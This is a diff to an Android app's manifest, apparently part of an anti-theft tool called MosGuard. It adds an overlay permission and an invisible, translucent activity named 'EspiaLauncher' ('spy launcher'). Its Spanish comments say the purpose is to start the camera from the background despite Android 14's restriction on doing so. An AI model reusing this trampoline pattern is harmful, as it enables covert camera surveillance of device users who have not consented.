@@ -36,6 +36,9 @@
     <!-- [MosGuard nativo] mensaje a pantalla completa (aviso de alta prioridad) + número de SIM (best-effort) -->
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <!-- [MosGuard trampolín] traer la app al frente desde 2º plano para poder ENCENDER la cámara
+         (Android 14+ bloquea arrancar el FGS de cámara de fondo). El dueño concede este permiso a mano. -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-feature android:name="android.hardware.camera.any" android:required="false" />
 
     <application
@@ -95,6 +98,15 @@
             android:exported="false"
             android:excludeFromRecents="true"
             android:theme="@style/Theme.YapeCaptor" />
+
+        <!-- [MosGuard trampolín] Activity translúcida que arranca el espía desde 2º plano -->
+        <activity
+            android:name=".EspiaLauncher"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleInstance"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
         <!-- [MosGuard nativo] administrador de dispositivo: bloqueo remoto + anti-desinstalación -->
         <receiver
